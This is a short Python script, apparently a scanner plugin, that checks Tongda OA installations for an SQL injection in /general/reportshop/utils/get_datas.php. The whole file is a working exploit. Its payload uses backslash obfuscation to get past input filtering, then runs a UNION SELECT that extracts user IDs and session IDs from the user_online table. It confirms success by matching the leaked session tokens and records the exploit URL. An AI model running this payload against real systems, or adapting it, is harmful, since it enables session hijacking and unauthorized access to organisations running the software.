import requests
import re, urllib

def verify(url):
    relsult = {
        'name': '通达OA sql注入(/general/reportshop/utils/get_datas.php)',
        'vulnerable': False,
        'url': url,
        'about': 'https://forum.butian.net/share/278',
    }
    timeout = 3
    payload = r'''?USER_ID=OfficeTask&PASSWORD=&col=1,1&tab=5%20whe\re%201={`\=%27`%201}%20un\ion%20(s\elect%20uid,sid%20fr\om%20user_online%20whe\re%201\={`=`%201})--%20%27'''
    vurl = urllib.parse.urljoin(url, '/general/reportshop/utils/get_datas.php')
    vurl2 = urllib.parse.urljoin(url, '/general/reportshop/utils/get_datas.php' + payload)
    try:
        rep1 = requests.get(vurl, timeout=timeout, verify=False)
        if rep1.status_code == 200 and re.search("未指定业务", rep1.text):
            rep2 = requests.get(vurl2, timeout=timeout, verify=False)
            if rep2.status_code == 200 and re.search("[a-z0-9]{26}", rep2.text):
                relsult['vulnerable'] = True
                relsult['vurl'] = vurl2
        return relsult
    except:
        return relsult
